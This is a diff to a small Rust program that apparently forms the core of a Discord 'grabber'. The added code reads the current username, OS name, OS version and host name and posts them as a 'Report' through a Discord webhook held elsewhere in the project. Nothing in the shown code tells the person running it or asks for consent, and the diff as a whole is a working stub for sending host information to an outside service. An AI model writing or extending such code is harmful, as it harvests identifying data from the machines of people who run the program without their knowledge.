@@ -6,12 +6,34 @@ use serenity::{
         webhook::Webhook,
     },
 };
+use std::env;
+use sysinfo::{System, SystemExt};
 
 mod consts;
 
 #[tokio::main]
 async fn main() {
-    send("Huh".to_string()).await.unwrap();
+
+    let sys = System::new_all();
+    let mut sysinfo = String::new();
+    sysinfo.push_str(&format!(
+        "Username:                {}\n",
+        env::var_os("USERNAME").unwrap().into_string().unwrap()
+    ));
+    sysinfo.push_str(&format!(
+        "System name:             {}\n",
+        unwrap_string(sys.name())
+    ));
+    sysinfo.push_str(&format!(
+        "System OS version:       {}\n",
+        unwrap_string(sys.os_version())
+    ));
+    sysinfo.push_str(&format!(
+        "System host name:        {}\n",
+        unwrap_string(sys.host_name())
+    ));
+
+    send(sysinfo).await.unwrap();
 }
 
 async fn send(data: String) -> Result<()> {
@@ -31,11 +53,17 @@ async fn send(data: String) -> Result<()> {
     // Execute webhook
     webhook
         .execute(&http, true, |w| {
-            w.content("content")
-                .username("username")
+            w.username("Report")
                 .embeds(vec![embed]);
             w
         })
         .await?;
     Ok(())
+}
+
+pub fn unwrap_string(info: Option<String>) -> String {
+    match info {
+        Some(s) => s,
+        None => "?".to_string(),
+    }
 }
